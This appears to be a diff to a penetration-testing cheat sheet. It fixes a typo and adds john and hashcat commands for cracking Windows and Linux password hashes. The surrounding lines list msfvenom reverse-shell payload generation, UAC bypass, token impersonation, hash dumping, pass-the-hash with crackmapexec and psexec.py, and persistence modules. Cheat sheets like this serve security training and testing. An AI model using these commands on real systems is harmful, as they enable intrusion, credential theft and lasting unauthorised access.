@@ -122,7 +122,7 @@ msfvenom -p linux/x86/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f elf > en
 # By Passing UAC             ===> use UAC tool / or use bypassuac_injections module in metasploit
 # Access Token Impersonation ===> load incognito 
  ```
-## linux Pruvilege Esclations:
+## linux Privilege Esclations:
 ```
 # Misconfigured Cron Jobs
 # Suid Binaries
@@ -145,6 +145,17 @@ use MSF module ===>  modules/post/linux/gather/hashdump
 crackmapexec smb <ip> -u username -H "NTLMHash"
 psexec.py username@<ip> -hashes:
 ```
+## Crack Hashing:
+```
+Windows:
+john --format=NT hash.txt --wordlist=/passPAThfile/
+hashcat -a3 -m 1000 hash.txt /passPAthfile/
+
+Linux:
+john --format=sha512crypt hash.txt --wordlist=/passPAThfile/
+hashcat -a3 -m 1800 hash.txt /passPAthfile/
+```
+
 ## Windows Persistence:
 ```
 # windows service
@@ -155,6 +166,7 @@ psexec.py username@<ip> -hashes:
 # sshkey persistence
 use MSF module ===> post/linux/manage/sshkey_persistence 
 ```
+
 
 
 
